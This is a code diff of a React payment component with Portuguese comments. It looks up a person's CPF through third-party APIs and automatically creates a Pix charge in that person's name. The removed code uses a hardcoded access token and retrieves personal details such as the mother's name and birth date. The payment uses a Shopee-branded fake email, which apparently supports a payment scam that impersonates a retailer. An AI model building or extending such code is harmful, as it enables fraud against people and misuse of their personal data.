@@ -21,11 +21,12 @@ interface PixQRCode {
 }
 
 interface CpfData {
-  cpf: string;
+  id: number;
   nome: string;
-  nome_mae: string;
-  data_nascimento: string;
-  sexo: string;
+  cpf: string;
+  telefone: string;
+  email: string;
+  data_cadastro: string;
 }
 
 const CpfPayment: React.FC = () => {
@@ -72,12 +73,13 @@ const CpfPayment: React.FC = () => {
     }
   };
 
-  // Função para buscar dados do CPF na API
+  // Função para buscar dados do CPF na API Recoveryfy
   const fetchCpfData = async (cpf: string) => {
     try {
       console.log(`[CPF-PAYMENT] Buscando dados para CPF: ${cpf}`);
       
-      const apiUrl = `https://api.amnesiatecnologia.rocks/?token=261207b9-0ec2-468a-ac04-f9d38a51da88&cpf=${cpf}`;
+      // Nova API Recoveryfy
+      const apiUrl = `https://recoveryfy.replit.app/api/v1/cliente/cpf/${cpf}`;
       
       const response = await fetch(apiUrl, {
         method: 'GET',
@@ -91,10 +93,11 @@ const CpfPayment: React.FC = () => {
         const data = await response.json();
         console.log('[CPF-PAYMENT] Dados recebidos:', data);
         
-        if (data.DADOS) {
-          setCpfData(data.DADOS);
+        // Verificar se a consulta foi bem-sucedida e há dados do cliente
+        if (data.sucesso && data.cliente) {
+          setCpfData(data.cliente);
           // Automaticamente gerar o pagamento após obter os dados
-          await generatePayment(data.DADOS);
+          await generatePayment(data.cliente);
         } else {
           setError('CPF não encontrado nos registros.');
         }
@@ -116,12 +119,12 @@ const CpfPayment: React.FC = () => {
       
       console.log('[CPF-PAYMENT] Gerando pagamento para:', userData.nome);
       
-      // Usar dados falsos para telefone e email conforme solicitado
+      // Usar dados reais do cliente da API Recoveryfy, ou dados falsos se não disponíveis
       const pixData = await createPixPayment({
         name: userData.nome,
         cpf: userData.cpf,
-        email: 'cliente@shopee.com.br', // Email fake
-        phone: '(11) 99999-9999' // Telefone fake
+        email: userData.email || 'cliente@shopee.com.br', // Usar email real ou fake
+        phone: userData.telefone || '(11) 99999-9999' // Usar telefone real ou fake
       });
       
       console.log('[CPF-PAYMENT] Pagamento gerado com sucesso:', pixData);
